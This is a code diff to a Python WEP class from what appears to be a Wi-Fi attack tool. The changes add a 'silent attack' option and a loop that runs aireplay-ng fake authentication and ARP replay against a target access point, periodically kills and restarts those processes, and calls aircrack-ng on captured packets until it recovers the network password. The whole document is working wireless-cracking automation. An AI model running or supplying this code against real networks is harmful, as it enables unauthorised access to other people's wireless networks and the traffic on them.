@@ -13,7 +13,7 @@ import threading
 
 
 class WEP(EncryptionType):
-    def __init__(self, network, interface, mac, verbose_level):
+    def __init__(self, network, interface, mac, verbose_level, silent_attack):
         """
         Constructor for the WEP class (also calls the parent constructor)
         :param network: target network for the attack
@@ -23,7 +23,7 @@ class WEP(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        EncryptionType.__init__(self, network, interface, verbose_level)
+        EncryptionType.__init__(self, network, interface, verbose_level, silent_attack)
         # super().__init__(self, network, interface)
         self.mac = mac
 
@@ -38,18 +38,57 @@ class WEP(EncryptionType):
         """
         super(WEP, self).scan_network(write_directory)
 
-        fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-a', self.mac, '-e', self.essid, '-T', '3', self.interface]
-        arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
-                        '--ignore-negative-one', self.interface]
+        if not self.silent_attack:
+            fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-b', self.bssid, '-e', self.essid, '-T', '3', self.interface,
+                            '-h', self.mac]
+            arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
+                            '--ignore-negative-one', self.interface]
 
-        #fakeauth_out, err = self.execute_command(fakeauth_cmd)
-        #print(fakeauth_out.decode('utf-8'))
+            fakeauth_out, err = self.execute_command(fakeauth_cmd)
+            self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
+            self.show_message(fakeauth_out.decode('utf-8'))
 
-        arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
-        arpreplay_thread.start()
-        arpreplay_thread.join(0)
+            arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
+            arpreplay_thread.start()
+            arpreplay_thread.join(0)
 
-        self.show_message("running aireplay thread on mac: " + self.mac)
+            self.show_message("Running aireplay thread on mac: " + self.mac)
+
+            counter = 0
+        else:
+            super().show_message("Running silent attack (no fake auth and no arp replay)")
+
+        password = ""
+
+        pgrep_aireplay_cmd = ['pgrep', 'aireplay']
+
+        while password == "":
+            password = self.crack_network()
+
+            if not self.silent_attack:
+                if counter == 10:
+                    self.show_message("Reseting aireplay every 20 seconds . . .")
+                    pgrep_out, err = self.execute_command(pgrep_aireplay_cmd)
+
+                    pgrep_out = pgrep_out.decode('utf-8')
+
+                    if pgrep_out != "":
+                        pids = pgrep_out.split('\n')
+                        for pid in pids:
+                            self.execute_command(['kill', '-9', pid])
+
+                    fakeauth_out, err = self.execute_command(fakeauth_cmd)
+                    self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
+                    self.show_message(fakeauth_out.decode('utf-8'))
+                    arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
+                    arpreplay_thread.start()
+                    arpreplay_thread.join(0)
+                    self.show_message("Running aireplay thread on mac: " + self.mac)
+                    counter = 0
+                else:
+                    counter+=1
+            time.sleep(2)
+        return password
 
     def crack_network(self):
         """
@@ -59,9 +98,10 @@ class WEP(EncryptionType):
         :Author: Miguel Yanes Fernández
         """
         aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap']
-        self.show_message("will execute aircrack")
+        self.show_message("---------Executing aircrack-----------")
         crack_out, crack_err = super().execute_command(aircrack_cmd)
-        self.show_message("finished aircrack")
+        self.show_message(crack_out.decode('utf-8'))
         # will need to filter the output from aircrack
         password = self.filter_aircrack(crack_out.decode('utf-8'))
+        self.show_message("--------------------------------------")
         return password
